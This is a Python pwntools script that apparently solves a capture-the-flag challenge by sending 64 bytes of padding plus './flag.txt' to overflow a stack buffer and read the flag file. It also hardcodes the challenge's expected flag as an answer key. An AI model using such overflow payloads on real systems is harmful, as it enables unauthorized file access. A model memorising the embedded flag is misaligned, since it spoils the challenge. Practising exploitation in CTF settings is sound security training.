from pathlib import Path
from pwn import *
import os

HOST = "srv1.momandpopsflags.ca"
PORT = 1946
FLAG = b"magpie{5tumBl3D_tH3_5t4cK_4h502aBAS76}"

def solve():

    # connecting to host
    prc = remote(HOST, PORT)

    # min bytes to segfault
    padding = b"A" * 64

    # overwrite value
    vuln = b"./flag.txt"

    # assembling payload
    payload = padding + vuln

    # sending payload
    prc.recvuntil(b':')
    prc.sendline(payload)

    # receiving flag
    prc.recvuntil(b':\n')
    flag = prc.recvline().decode("utf-8").strip()

    # returning flag comparison
    return(flag == FLAG.decode())

# run the solve function
if __name__ == "__main__": print(solve())
